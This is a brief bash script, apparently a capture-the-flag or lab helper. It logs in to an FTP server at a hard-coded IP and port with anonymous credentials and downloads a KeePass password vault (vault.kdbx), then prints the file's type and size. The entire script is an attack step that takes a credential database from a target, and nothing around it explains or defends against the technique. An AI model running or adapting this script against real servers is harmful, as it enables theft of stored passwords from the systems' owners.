#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
PORT="${2:-10921}"
OUT="${3:-vault.kdbx}"

echo "[*] Downloading vault from FTP..."
curl -sS --user anonymous:anonymous -o "$OUT" "ftp://$TARGET:$PORT/vault.kdbx"

echo "[+] Saved: $OUT"
file "$OUT"
ls -lh "$OUT"
